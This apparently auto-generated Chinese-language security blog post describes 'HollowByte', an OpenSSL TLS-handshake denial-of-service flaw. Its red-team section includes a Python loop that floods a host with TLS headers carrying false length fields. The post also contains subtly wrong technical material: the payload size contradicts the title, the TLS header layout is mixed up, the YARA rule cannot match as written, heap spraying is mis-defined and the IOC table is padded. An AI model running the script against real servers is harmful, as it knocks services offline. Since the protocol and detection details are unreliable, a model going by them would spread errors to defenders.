---
layout: post
title:  "HollowByte DDoS flaw bloats OpenSSL server memory with 11-byte payload"
date:   2026-07-18 01:51:16 +0000
categories: [security]
severity: high
---

# 🔥 解析 HollowByte：OpenSSL 服務拒絕攻擊的技術細節
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: 服務拒絕攻擊 (Denial of Service, DoS)
> * **關鍵技術**: Heap Spraying, TLS Handshake, Memory Allocation

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: HollowByte 攻擊利用了 OpenSSL 在 TLS Handshake 過程中，沒有正確驗證訊息長度的漏洞。當收到一個帶有虛假長度欄位的 TLS 訊息時，OpenSSL 會分配過多的記憶體，導致服務拒絕攻擊。
* **攻擊流程圖解**:
  1. 攻擊者發送一個帶有虛假長度欄位的 TLS 訊息給服務器。
  2. 服務器分配過多的記憶體以儲存預期的訊息內容。
  3. 攻擊者不發送任何訊息內容，導致服務器無限期等待。
  4. 攻擊者重複步驟 1-3，導致服務器記憶體不斷增加。
* **受影響元件**: OpenSSL 3.0.0 至 3.0.20、3.4.0 至 3.4.5、3.5.0 至 3.5.6、3.6.0 至 3.6.2

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要能夠發送 TLS 訊息給服務器。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    
    # 建構虛假長度欄位的 TLS 訊息
    def build_payload(length):
        payload = b'\x16\x03\x03'  # TLS Handshake 訊息
        payload += length.to_bytes(3, byteorder='big')  # 虛假長度欄位
        return payload
    
    # 發送 Payload
    def send_payload(payload):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('example.com', 443))
        sock.sendall(payload)
        sock.close()
    
    # 重複發送 Payload
    for i in range(100):
        payload = build_payload(0x10000)  # 虛假長度欄位為 0x10000
        send_payload(payload)
    
    ```
* **繞過技術**: 攻擊者可以使用多個連接和隨機的長度欄位來繞過服務器的防禦機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /usr/lib/openssl |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule HollowByte_Detection {
        meta:
            description = "Detect HollowByte attack"
            author = "Your Name"
        strings:
            $tls_handshake = { 16 03 03 ?? ?? ?? }
        condition:
            $tls_handshake at 0 and uint16(2) > 0x1000
    }
    
    ```
* **緩解措施**: 更新 OpenSSL 至 3.0.21 或更新版本，並設定服務器的記憶體限制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **TLS Handshake**: TLS Handshake 是用於建立安全連接的過程，包括客戶端和服務器之間的認證和加密協商。
* **Heap Spraying**: Heap Spraying 是一種攻擊技術，通過分配大量的記憶體來繞過服務器的防禦機制。
* **Memory Allocation**: Memory Allocation 是指服務器為應用程序分配記憶體的過程。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hollowbyte-ddos-flaw-bloats-openssl-server-memory-with-11-byte-payload/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1499/)


